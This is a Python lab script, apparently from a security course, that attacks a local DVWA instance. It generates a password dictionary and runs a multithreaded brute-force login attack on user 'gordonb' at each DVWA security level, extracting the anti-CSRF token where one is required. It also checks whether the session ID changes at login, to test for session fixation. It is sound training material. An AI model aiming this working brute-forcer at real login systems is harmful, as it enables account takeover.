#!/usr/bin/env python3
"""17 · 暴力破解与会话安全 —— 多线程爆破器 / token 流程 / 会话固定检查

用法:
    python3 brute_lab.py gen-dict                                  # 生成两份字典
    python3 brute_lab.py brute --level low|medium|high|impossible \
        --dict artifacts/dict-100.txt [--threads 4] [--user gordonb]
    python3 brute_lab.py sess-check                                # 会话固定检查

攻击目标：DVWA 的 Brute Force 模块——先以 admin 登入靶站取得模块访问权，
再对 gordonb 的登录做口令爆破（字典 100 条，第 87 条是正确口令）。
所有请求只发往本机靶场。
"""
import argparse
import re
import sys
import threading
import time
from pathlib import Path

import requests

BASE = "http://127.0.0.1:8612"
BRUTE = f"{BASE}/vulnerabilities/brute/"
ART = Path(__file__).parent / "artifacts"
SUCCESS_MARK = "Welcome to the password protected area"
CORRECT_PW = "abc123"          # gordonb 的预设口令（爆破目标）
TOKEN_RE = r"name='user_token' value='([^']+)'"
DECOYS = [
    "123456", "12345678", "qwerty", "111111", "admin123", "letmein",
    "monkey", "dragon", "master", "shadow", "superman", "football",
    "iloveyou", "trustno1", "sunshine", "princess", "welcome", "login",
    "passw0rd", "abc1234", "qwerty123", "1q2w3e", "root", "toor", "test",
]


def login(level="low"):
    """以 admin 登入靶站（模块访问权 + 档位由会话决定）。"""
    s = requests.Session()
    r = s.get(f"{BASE}/login.php", timeout=5)
    tok = re.search(TOKEN_RE, r.text).group(1)
    s.post(f"{BASE}/login.php", timeout=5,
           data={"username": "admin", "password": "password",
                 "Login": "Login", "user_token": tok})
    r = s.get(f"{BASE}/security.php", timeout=5)
    tok = re.search(TOKEN_RE, r.text).group(1)
    s.post(f"{BASE}/security.php", timeout=5,
           data={"security": level, "seclev_submit": "Submit", "user_token": tok})
    return s


def cmd_gen_dict(a):
    ART.mkdir(exist_ok=True)
    words = []
    for i in range(4):
        for d in DECOYS:
            words.append(d if i == 0 else f"{d}{['', '!', '123', '2024'][i]}")
    words[86] = CORRECT_PW                       # 第 87 条 = 目标口令
    (ART / "dict-100.txt").write_text("\n".join(words) + "\n", encoding="utf-8")
    imp = [words[0], words[1], words[2], CORRECT_PW, words[4]]
    (ART / "dict-impossible.txt").write_text("\n".join(imp) + "\n", encoding="utf-8")
    print(f"[gen] dict-100.txt        {len(words)} 条（第 87 条 = 目标口令）")
    print(f"[gen] dict-impossible.txt {len(imp)} 条（第 4 条 = 正确口令）")
    return 0


def attempt(sess, user, word, level):
    """一次登录尝试；返回是否命中。"""
    if level in ("high", "impossible"):
        page = sess.get(BRUTE, timeout=10)
        tok = re.search(TOKEN_RE, page.text).group(1)
    else:
        tok = None
    payload = {"username": user, "password": word, "Login": "Login"}
    if tok:
        payload["user_token"] = tok
    if level == "impossible":
        r = sess.post(BRUTE, data=payload, timeout=10)
    else:
        r = sess.get(BRUTE, params=payload, timeout=10)
    return SUCCESS_MARK in r.text


def cmd_brute(a):
    words = Path(a.dict).read_text(encoding="utf-8").splitlines()
    words = [w for w in words if w]
    lock = threading.Lock()
    state = {"next": 0, "hit": None}
    t0 = time.time()

    def worker():
        sess = login(a.level)
        while True:
            with lock:
                if state["hit"] is not None or state["next"] >= len(words):
                    return
                i = state["next"]
                state["next"] += 1
            if attempt(sess, a.user, words[i], a.level):
                with lock:
                    state["hit"] = i
                return

    print(f"[brute] 目标={a.user} 字典={len(words)} 条 线程={a.threads} 档位={a.level}")
    threads = [threading.Thread(target=worker) for _ in range(a.threads)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    elapsed = time.time() - t0
    if state["hit"] is not None:
        i = state["hit"]
        print(f"[brute] ✅ 命中：字典第 {i + 1} 条 → {a.user}/{words[i]}（耗时 {elapsed:.1f} 秒）")
        return 0
    print(f"[brute] ❌ {len(words)} 条全部失败（耗时 {elapsed:.1f} 秒）")
    return 1


def cmd_sess_check(a):
    s = requests.Session()
    s.get(f"{BASE}/login.php", timeout=5)        # 先建立会话
    sid0 = s.cookies.get("PHPSESSID")
    r = s.get(f"{BASE}/login.php", timeout=5)
    tok = re.search(TOKEN_RE, r.text).group(1)
    s.post(f"{BASE}/login.php", timeout=5,
           data={"username": "admin", "password": "password",
                 "Login": "Login", "user_token": tok})
    sid1 = s.cookies.get("PHPSESSID")
    rotated = sid0 != sid1
    print(f"[sess] 登录前后 PHPSESSID：{'已轮换' if rotated else '未轮换'}"
          f"（{sid0[:6]}… → {sid1[:6]}…）")
    if not rotated:
        print("[sess] 结论：未轮换 ⇒ 会话固定面——攻击者若能先把已知 ID 塞进")
        print("[sess]       受害者浏览器，登录后的会话依然是这个 ID（修复：登录成功时重新生成会话）")
        return 0
    print("[sess] 结论：登录时重新生成会话 ID，会话固定在本栈不成立")
    return 0


def main():
    ap = argparse.ArgumentParser(description="暴力破解与会话安全（仅本机 DVWA）")
    sub = ap.add_subparsers(dest="cmd", required=True)

    p0 = sub.add_parser("gen-dict")
    p0.set_defaults(func=cmd_gen_dict)

    p1 = sub.add_parser("brute")
    p1.add_argument("--level", default="low",
                    choices=["low", "medium", "high", "impossible"])
    p1.add_argument("--dict", required=True)
    p1.add_argument("--user", default="gordonb")
    p1.add_argument("--threads", type=int, default=4)
    p1.set_defaults(func=cmd_brute)

    p2 = sub.add_parser("sess-check")
    p2.set_defaults(func=cmd_sess_check)

    args = ap.parse_args()
    return args.func(args)


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n[!] 已中断", file=sys.stderr)
        sys.exit(130)
